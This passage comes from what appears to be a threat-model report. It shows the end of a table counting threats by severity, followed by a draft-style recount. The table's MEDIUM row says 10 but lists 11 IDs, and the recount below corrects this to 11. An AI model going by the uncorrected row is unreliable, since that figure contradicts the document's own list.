| MEDIUM | 10 | TM-008, TM-009, TM-011, TM-012, TM-015, TM-016, TM-017, TM-018, TM-021, TM-025, TM-026 |
| LOW | 3 | TM-010, TM-019, TM-020 |
| **Total** | **26** | |

**Note**: HIGH count is 10 (corrected from 9 -- TM-024 makes 10). MEDIUM count is 11. Recount: CRITICAL=2, HIGH=10, MEDIUM=11, LOW=3. Total=26. Verified.

**Correction**: Let me recount carefully.

CRITICAL: TM-003, TM-004 = **2**
HIGH: TM-001, TM-002, TM-005, TM-006, TM-007, TM-013, TM-014, TM-022, TM-023, TM-024 = **10**
MEDIUM: TM-008, TM-009, TM-011, TM-012, TM-015, TM-016, TM-017, TM-018, TM-021, TM-025, TM-026 = **11**
LOW: TM-010, TM-019, TM-020 = **3**
Total: **26**
